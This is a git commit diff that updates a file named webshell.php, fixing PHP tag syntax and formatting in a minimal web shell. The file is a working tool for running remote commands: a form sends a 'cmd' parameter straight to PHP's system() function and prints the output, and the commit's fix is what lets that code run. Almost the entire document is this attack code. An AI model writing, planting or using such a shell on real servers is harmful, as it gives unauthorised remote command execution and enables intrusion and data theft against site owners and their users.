14f20d106ba7bda4b3983931b84a2d53b9241ac8
Prabhash Thakur <68106479+Prabhash-bit@users.noreply.github.com>
2025-01-16 09:30:15 +0400

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,18 +1,18 @@
 <html>
 <body>
-<form method="GET" name=" <? php echo basename($_SERVER[ 'PHP_SELF' ]) ; ?>">
+<form method="GET" name=" <?php echo basename($_SERVER[ 'PHP_SELF' ]); ?>">
 <input type="TEXT" name="cmd" id="cmd" size="80">
 <input type="SUBMIT" value="Execute">
 </form>
 <pre>
 <br>
 <b>Command Output: </b>
-<? php
-if(isset($_GET['cmd']))
-{
-system($_GET['cmd']);
-}
+<?php
+	if(isset($_GET['cmd']))
+	{
+	system($_GET['cmd']);
+	}
 ?>
 </pre>
 </body>
-<script>document.getElementById("cmd") .focus() ;< /script>
+<script>document.getElementById("cmd").focus();< /script>
